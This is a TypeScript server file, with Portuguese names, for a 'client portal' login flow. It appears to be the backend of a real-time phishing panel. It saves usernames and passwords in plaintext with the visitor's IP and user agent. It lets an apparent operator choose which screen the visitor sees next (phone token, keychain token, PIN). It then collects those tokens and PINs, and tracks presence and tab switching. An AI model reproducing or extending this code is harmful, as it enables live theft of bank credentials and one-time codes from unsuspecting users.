import { createServerFn } from "@tanstack/react-start";
import { getRequest } from "@tanstack/react-start/server";
import { z } from "zod";

const envioSchema = z.object({
  usuario: z.string().trim().min(3, "Informe o usuário").max(60),
  senha: z.string().min(1, "Informe a senha").max(72),
  origem: z.string().trim().max(60).default("portal-cliente"),
});

function extrairIp(req: Request): string | null {
  const h = req.headers;
  const cand =
    h.get("cf-connecting-ip") ||
    h.get("x-real-ip") ||
    h.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    null;
  return cand ?? null;
}

export const enviarSolicitacao = createServerFn({ method: "POST" })
  .validator((input: unknown) => envioSchema.parse(input))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const req = getRequest();
    const ip = req ? extrairIp(req) : null;
    const ua = req?.headers.get("user-agent") ?? null;

    const { data: row, error } = await supabaseAdmin
      .from("solicitacoes")
      .insert({
        usuario: data.usuario,
        credencial: data.senha,
        origem: data.origem,
        status: "pendente",
        ip,
        user_agent: ua,
        fase: "senha",
        ultimo_ping: new Date().toISOString(),
      })
      .select("id")
      .single();

    if (error) throw new Error(error.message);
    return { id: row.id as string };
  });

const statusSchema = z.object({ id: z.string().uuid() });

export const verificarStatus = createServerFn({ method: "GET" })
  .validator((input: unknown) => statusSchema.parse(input))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: row, error } = await supabaseAdmin
      .from("solicitacoes")
      .select(
        "status, motivo, proxima_tela, token, token_em, pin, pin_em, fase, token_serial, token_nome, qr_code_url",
      )
      .eq("id", data.id)
      .maybeSingle();
    if (error) throw new Error(error.message);
    if (!row) {
      return {
        status: "removido",
        motivo: null,
        proxima_tela: null,
        token: null,
        token_em: null,
        pin: null,
        pin_em: null,
        fase: null,
        token_serial: null,
        token_nome: null,
        qr_code_url: null,
      };
    }
    return {
      status: row.status as string,
      motivo: (row.motivo as string | null) ?? null,
      proxima_tela:
        (row.proxima_tela as
          | "token_celular"
          | "token_chaveiro"
          | "pin"
          | "sucesso"
          | "interna"
          | "interna_token_celular"
          | "interna_token_chaveiro"
          | null) ?? null,
      token: (row.token as string | null) ?? null,
      token_em: (row.token_em as string | null) ?? null,
      pin: (row.pin as string | null) ?? null,
      pin_em: (row.pin_em as string | null) ?? null,
      fase: (row.fase as string | null) ?? null,
      token_serial: (row.token_serial as string | null) ?? null,
      token_nome: (row.token_nome as string | null) ?? null,
      qr_code_url: (row.qr_code_url as string | null) ?? null,
    };
  });

const presencaSchema = z.object({
  id: z.string().uuid(),
  fase: z.enum(["senha", "token_celular", "token_chaveiro", "pin", "concluido"]).optional(),
  mudou_aba: z.boolean().optional(),
});

export const atualizarPresenca = createServerFn({ method: "POST" })
  .validator((input: unknown) => presencaSchema.parse(input))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const patch: {
      ultimo_ping: string;
      fase?: "senha" | "token_celular" | "token_chaveiro" | "pin" | "concluido";
      mudou_aba?: boolean;
    } = { ultimo_ping: new Date().toISOString() };
    if (data.fase !== undefined) patch.fase = data.fase;
    if (data.mudou_aba !== undefined) patch.mudou_aba = data.mudou_aba;
    await supabaseAdmin.from("solicitacoes").update(patch).eq("id", data.id);
    return { ok: true };
  });

const tokenSchema = z.object({
  id: z.string().uuid(),
  token: z.string().trim().min(1, "Informe o token").max(60),
});

export const enviarToken = createServerFn({ method: "POST" })
  .validator((input: unknown) => tokenSchema.parse(input))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin
      .from("solicitacoes")
      .update({
        token: data.token,
        token_em: new Date().toISOString(),
        fase: "concluido",
      })
      .eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

const pinSchema = z.object({
  id: z.string().uuid(),
  pin: z.string().trim().min(1, "Informe o PIN").max(20),
});

export const enviarPin = createServerFn({ method: "POST" })
  .validator((input: unknown) => pinSchema.parse(input))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin
      .from("solicitacoes")
      .update({
        pin: data.pin,
        pin_em: new Date().toISOString(),
        fase: "concluido",
      })
      .eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });
